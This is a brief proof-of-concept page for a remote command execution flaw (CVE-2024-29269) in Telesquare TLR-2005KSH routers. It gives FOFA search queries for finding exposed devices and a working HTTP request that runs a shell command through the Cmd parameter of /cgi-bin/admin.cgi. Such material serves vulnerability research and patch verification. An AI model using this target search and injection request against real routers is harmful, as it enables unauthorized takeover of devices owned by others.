## Telesquare路由器RCE(CVE-2024-29269)

## fofa
```
title="Login to TLR-2005KSH"
app="TELESQUARE-TLR-2005KSH"
```

## poc
```
GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=id HTTP/1.1
Host: x.x.x.x:8085

```

![image](https://github.com/wy876/POC/assets/139549762/3fc91aca-15c0-41e7-94b0-06954993c86b)
